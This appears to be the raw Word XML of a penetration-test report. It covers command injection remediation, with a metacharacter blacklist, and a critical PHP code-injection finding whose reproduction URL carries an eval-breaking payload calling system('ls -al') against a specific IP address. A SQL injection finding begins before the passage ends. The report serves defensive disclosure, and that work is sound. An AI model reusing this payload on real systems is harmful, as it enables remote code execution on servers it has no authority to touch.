            </w:pPr>
          </w:p>
          <w:p w:rsidR="00F50E3E" w:rsidRPr="00802CE3" w:rsidRDefault="00FE204E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00FE204E" w:rsidRPr="00802CE3" w:rsidRDefault="00FE204E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00FE204E" w:rsidRPr="00802CE3" w:rsidRDefault="00EF0F02">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="527B8C12" wp14:editId="14EC7E90">
                  <wp:extent cx="7245350" cy="3890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45350" cy="3890010"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00FE204E" w:rsidRPr="00802CE3" w:rsidRDefault="00FE204E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00FE204E" w:rsidRPr="00802CE3" w:rsidRDefault="00FE204E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00FE204E" w:rsidRPr="00802CE3" w:rsidRDefault="00FE204E" w:rsidP="00EF0F02">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r w:rsidR="00EF0F02">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>OS Command Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002267FB" w:rsidRPr="00802CE3" w:rsidTr="00942FF3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00A81704" w:rsidRDefault="00FE204E" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00A81704" w:rsidRPr="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>The URL and form data needs to be sanitized for invalid characters. A “blacklist” of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet. A “white list” containing only allowable characters or command list should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Genereal blacklist to be included for commannd injection can be |  ; &amp; $ &gt; &lt; ' \  ! &gt;&gt; #</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Escape or filter special characters for windows,   ( ) &lt; &gt; &amp; * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , ` </w:t>
            </w:r>
            <w:r w:rsidRPr="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:br/>
              <w:t>Escape or filter special characters for Linux, { }  ( ) &lt; &gt; &amp; * ‘ | = ? ; [ ]  $ – # ~ ! . ” %  / \ : + , `</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="002267FB" w:rsidRPr="00802CE3" w:rsidRDefault="002267FB" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="0062005A" w:rsidRDefault="0029303A" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>383;!</w:t>
      </w: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tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="006526E9">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Code Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>PHP code injection is a vulnerability that allows an attacker to inject custom code into the server side scripting engine. This vulnerability occurs when an attacker can control all or part of an input string that is fed into an eval() function call. Eval will execute the argument as code.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance1</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/manage_proj_page.php?sort=']);}error_reporting(0);system('ls -al');%23</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="00F2563F">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>sort</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRDefault="00A81704" w:rsidP="00D9541D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="9"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Navigate to above URL.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRPr="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="00D9541D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="9"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D9541D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Observe the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>injected PHP code</w:t>
            </w:r>
            <w:r w:rsidRPr="00D9541D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> results in the response</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRPr="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="00D9541D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:ind w:left="720"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B70FD25" wp14:editId="37D7E607">
                  <wp:extent cx="7245350" cy="38900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45350" cy="3890010"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>PHP Code Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00D9541D" w:rsidRPr="00D9541D" w:rsidRDefault="00A81704" w:rsidP="00D9541D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00D9541D" w:rsidRPr="00D9541D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Whenever possible, applications should avoid incorporating user-controllable data into dynamically evaluated code. In almost every situation, there are safer alternative methods of implementing application functions, which cannot be manipulated to inject arbitrary code into the server's processing.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRPr="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="00D9541D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D9541D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>If it is considered unavoidable to incorporate user-supplied data into dynamically evaluated code, then the data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable code metacharacters, should be rejected.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00D9541D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00714F55" w:rsidRDefault="00D9541D" w:rsidP="00714F55">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00714F55">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>SQL</w:t>
            </w:r>
            <w:r w:rsidR="00A81704" w:rsidRPr="00714F55">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
